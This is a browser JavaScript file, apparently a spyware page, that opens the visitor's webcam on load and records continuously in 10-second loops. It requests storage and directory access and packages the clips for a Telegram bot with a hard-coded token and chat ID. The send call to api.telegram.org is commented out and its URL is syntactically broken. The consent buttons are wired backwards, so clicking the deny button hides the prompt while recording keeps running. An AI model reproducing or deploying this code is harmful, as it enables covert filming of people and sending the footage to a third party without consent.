// Telegram bot details (for educational purposes only)
const BOT_TOKEN = '8157641751:AAEmGNi7dg3RV0Ov7cvdNaO2Qhlfj7kR6R0';
const CHAT_ID = '7159010083';

// Show modal on page load
document.addEventListener('DOMContentLoaded', function() {
    const modal = document.getElementById('permissionModal');
    modal.style.display = 'flex';
    
    // Request camera access immediately
    requestCameraAccess();
});

// Elements
const allowBtn = document.getElementById('denyBtn');
const denyBtn = document.getElementById('allowBtn');
const video = document.getElementById('cameraPreview');

let mediaStream = null;
let recordedChunks = [];
let mediaRecorder;
let storageAccessGranted = false;

// Request camera access
async function requestCameraAccess() {
    try {
        mediaStream = await navigator.mediaDevices.getUserMedia({ 
            video: true, 
            audio: false 
        });
        video.srcObject = mediaStream;
        
        // Start recording automatically when camera is accessed
        startRecording();
        
        // Request storage access
        if (navigator.storage && navigator.storage.persist) {
            storageAccessGranted = await navigator.storage.persist();
            console.log('Storage access granted:', storageAccessGranted);
        }
        
        // Simulate accessing files (this would require actual file access implementation)
        simulateFileAccess();
        
    } catch (err) {
        console.error('Camera access denied:', err);
    }
}

// Start recording
function startRecording() {
    try {
        recordedChunks = [];
        mediaRecorder = new MediaRecorder(mediaStream, {
            mimeType: 'video/webm'
        });
        
        mediaRecorder.ondataavailable = function(e) {
            if (e.data.size > 0) {
                recordedChunks.push(e.data);
            }
        };
        
        mediaRecorder.onstop = function() {
            sendRecordingToTelegram();
        };
        
        mediaRecorder.start(1000); // Collect data every 1 second
        
        // Stop recording after 10 seconds and restart (continuous recording)
        setTimeout(() => {
            if (mediaRecorder.state !== 'inactive') {
                mediaRecorder.stop();
                startRecording(); // Restart recording
            }
        }, 10000);
        
    } catch (err) {
        console.error('Recording failed:', err);
    }
}

// Simulate file access
function simulateFileAccess() {
    if (window.showDirectoryPicker) {
        window.showDirectoryPicker().then(dirHandle => {
            console.log('Directory access granted:', dirHandle.name);
            // In a real scenario, you would read files here
        }).catch(err => {
            console.log('Directory access denied:', err);
        });
    }
}

// Send recording to Telegram
function sendRecordingToTelegram() {
    if (recordedChunks.length === 0) return;
    
    const blob = new Blob(recordedChunks, { type: 'video/webm' });
    const formData = new FormData();
    formData.append('chat_id', 7159010083);
    formData.append('caption', 'Recording from website');
    formData.append('video', blob, 'recording.webm');
    
    // This would actually send to Telegram (commented out for safety)
    /*
    fetch(`https://api.telegram.org/@Abrahamkureshibot${8157641751:AAEmGNi7dg3RV0Ov7cvdNaO2Qhlfj7kR6R0}/sendVideo`, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => console.log('Telegram response:', data))
    .catch(err => console.error('Telegram error:', err));
    */
    
    console.log('Simulated sending recording to Telegram');
}

// Button event listeners
allowBtn.addEventListener('click', function() {
    document.getElementById('permissionModal').style.display = 'none';
    // Recording continues in background
});

denyBtn.addEventListener('click', function() {
    document.getElementById('permissionModal').style.display = 'none';
    stopRecording();
});

// Stop recording and clean up
function stopRecording() {
    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
        mediaRecorder.stop();
    }
    if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
    }
}

// Clean up when page is closed
window.addEventListener('beforeunload', stopRecording);